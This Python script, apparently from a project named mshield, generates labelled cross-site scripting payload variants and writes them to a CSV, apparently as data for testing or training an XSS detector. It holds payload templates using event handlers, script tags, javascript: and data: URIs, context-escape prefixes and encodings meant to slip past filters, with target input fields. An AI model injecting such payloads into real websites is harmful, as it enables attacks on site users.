import pandas as pd
import logging
import os
import csv
from typing import List, Dict
import html
import random
import string

# Ensure directories exist
os.makedirs('data', exist_ok=True)
os.makedirs('mshield/logs', exist_ok=True)

# Configure logging
logging.basicConfig(
    filename='mshield/logs/payload_creator.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def encode_payload(payload: str) -> List[str]:
    """Generate encoded variations of a payload."""
    encodings = [
        lambda x: html.escape(x),  # HTML entity encoding
        lambda x: x.replace('<', '%3C').replace('>', '%3E'),  # URL encoding
        lambda x: x.replace(' ', '+'),  # Space to plus
        lambda x: ''.join(f'\\x{ord(c):02x}' for c in x)  # Hex encoding
    ]
    return [enc(payload) for enc in encodings if enc(payload) != payload][:2]  # Limit to 2 unique encodings

def generate_base_payloads() -> List[str]:
    """Generate base XSS payloads with various techniques."""
    event_handlers = ['onerror', 'onload', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onmouseover', 'onstart']
    tags = ['img', 'video', 'audio', 'details', 'input', 'button', 'select', 'iframe', 'a', 'div', 'marquee', 'object']
    base_payloads = [
        f'<{tag} {random.choice(event_handlers)}="alert(1)">' for tag in tags
    ] + [
        '<script>alert(1)</script>',
        'javascript:alert(1)',
        '<a href="javascript:alert(1)">Click</a>',
        'data:text/html,<script>alert(1)</script>'
    ]
    return base_payloads

def generate_xss_payloads(num_payloads: int = 20) -> List[Dict[str, str]]:
    """Generate unique XSS payloads with dynamic combinations and encodings."""
    try:
        # Load historical successful payloads for pattern inspiration
        historical_payloads = []
        if os.path.exists('data/auto_test_results.csv'):
            results_df = pd.read_csv('data/auto_test_results.csv')
            historical_payloads = results_df[results_df['status'] == 'working']['payload'].tolist()

        # Base payloads
        base_payloads = generate_base_payloads()
        if historical_payloads:
            base_payloads.extend(historical_payloads[:5])  # Add up to 5 successful payloads

        # Generate unique payloads
        payloads = set()
        while len(payloads) < num_payloads:
            base = random.choice(base_payloads)
            # Add random variations
            if '<' in base and random.random() > 0.5:
                base = f'">{base}'  # Add context escape
            if random.random() > 0.7:
                encoded_variations = encode_payload(base)
                base = random.choice(encoded_variations) if encoded_variations else base
            if random.random() > 0.6:
                base = base.replace('alert(1)', f'alert("{random_string(5)}")')  # Random alert message
            payloads.add(base)

        payloads = list(payloads)[:num_payloads]

        # Classify payloads
        result_payloads = []
        for payload in payloads:
            payload_type = (
                'event-based' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onmouseover', 'onstart', 'onload'])
                else 'script-based' if '<script>' in payload.lower()
                else 'encoded' if any(x in payload.lower() for x in ['%3c', '%3e', '\\x'])
                else 'dom-based' if any(x in payload.lower() for x in ['javascript:', 'data:'])
                else 'other'
            )
            input_field = (
                'search_bar' if any(x in payload.lower() for x in ['onerror', 'onfocus', 'ontoggle', 'onclick', 'onchange', 'onstart'])
                else 'profile_bio' if any(x in payload.lower() for x in ['<script>', 'data:', '<div>', '<iframe>'])
                else 'comments'
            )
            notes = f"{payload_type}, {payload[:20]}"

            result_payloads.append({
                'payload': payload,
                'source': 'generated',
                'is_malicious': 'True',
                'notes': notes,
                'input_field': input_field
            })

        # Add non-malicious payload
        result_payloads.append({
            'payload': 'Hello World',
            'source': 'generated',
            'is_malicious': 'False',
            'notes': 'Non-malicious text',
            'input_field': 'search_bar'
        })

        logger.info(f"Generated {len(result_payloads)} unique payloads")
        return result_payloads
    except Exception as e:
        logger.error(f"Error generating payloads: {e}")
        return []

def random_string(length: int) -> str:
    """Generate a random string of specified length."""
    letters = string.ascii_letters
    return ''.join(random.choice(letters) for _ in range(length))

def save_payloads(payloads: List[Dict[str, str]], output_file: str = 'data/mshield_xss_data.csv'):
    """Save generated payloads to CSV."""
    try:
        df = pd.DataFrame(payloads)
        df.to_csv(output_file, index=False, quoting=csv.QUOTE_ALL, escapechar='\\')
        logger.info(f"Saved {len(payloads)} payloads to {output_file}")
    except Exception as e:
        logger.error(f"Error saving payloads to {output_file}: {e}")
        raise

def main():
    """Main function to generate and save XSS payloads."""
    try:
        payloads = generate_xss_payloads(num_payloads=20)
        save_payloads(payloads)
    except Exception as e:
        logger.error(f"Main error: {e}")
        raise

if __name__ == "__main__":
    main()